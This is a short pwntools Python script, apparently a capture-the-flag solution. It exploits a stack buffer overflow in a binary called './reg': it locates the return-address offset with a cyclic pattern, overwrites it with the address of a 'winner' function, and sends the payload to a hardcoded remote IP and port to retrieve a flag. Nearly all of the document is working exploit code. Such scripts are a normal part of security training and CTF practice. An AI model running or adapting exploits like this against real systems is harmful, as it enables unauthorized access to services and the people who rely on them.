from pwn import *

# def start(argv=[], *a, **kw):
#     if args.GDB:   # Set GDBscript below
#         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#     elif args.REMOTE:  # ('server', 'port')
#         return remote(sys.argv[1], sys.argv[2], *a, **kw)
#     else:  # Run locally
#         return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('Enter your name : ', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    #ip_offset = cyclic_find(p.corefile.eip)
    ip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))   # need address from rip
    info('located EIP offset at {a}'.format(a=ip_offset))
    # Return the EIP offset
    return ip_offset

# Set up pwntools for the correct architecture
exe = './reg'
# This will automatically get contect arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
#context.encoding = 'utf8'

##### EXPLOIT #####

# Pass in pattern size, gt back EIP offset
offset = find_ip(cyclic(100))

# Start program
# io = process()
io = remote('157.245.41.162', '30952')
# Build the payload
payload = flat({
    offset: elf.functions.winner #0x401206
})

# gdb.attach(io, gdbscript='''
# init.pwndbg
# ''')

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('Enter your name : ', payload)
io.recvuntil("Congratulations!\n")
# Get the flag
flag = io.recv()
success(flag)
